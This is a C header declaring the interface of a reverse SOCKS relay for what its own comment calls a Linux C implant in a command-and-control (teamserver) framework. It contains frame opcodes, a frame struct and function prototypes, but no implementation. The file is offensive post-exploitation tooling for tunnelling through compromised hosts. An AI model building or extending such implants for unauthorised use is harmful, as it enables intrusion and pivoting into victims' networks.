#ifndef ARK_SOCKS_H
#define ARK_SOCKS_H

#include <stddef.h>
#include <stdint.h>

/* SocksFrameOp (proto/c2.proto) */
#define ARK_SOCKS_OPEN         1
#define ARK_SOCKS_OPEN_RESULT  2
#define ARK_SOCKS_DATA         3
#define ARK_SOCKS_CLOSE        4

#define ARK_SOCKS_MAX_FRAME_DATA (32u << 10)
#define ARK_SOCKS_MAX_TARGET     256

typedef struct ark_socks_frame {
    uint32_t conn_id;
    int32_t  op;
    char     target[ARK_SOCKS_MAX_TARGET];
    uint8_t *data;
    size_t   data_len;
    int32_t  status; /* OPEN_RESULT: 0 = ok */
} ark_socks_frame;

/*
 * Reverse SOCKS agent (Linux C implant). Teamserver listens; implant dials.
 * Target forms: "host:port", "1.2.3.4:80", "[2001:db8::1]:443".
 * Bare IPv6 without brackets is rejected (ambiguous colons).
 */
int  ark_socks_active(void);
void ark_socks_drain(ark_socks_frame **out, size_t *count);
void ark_socks_requeue(ark_socks_frame *frames, size_t count);
void ark_socks_handle(const ark_socks_frame *frames, size_t count);
void ark_socks_frames_free(ark_socks_frame *frames, size_t count);
/* Close all conns, clear queue, disable relay (EXIT / process teardown). */
void ark_socks_shutdown(void);

#endif
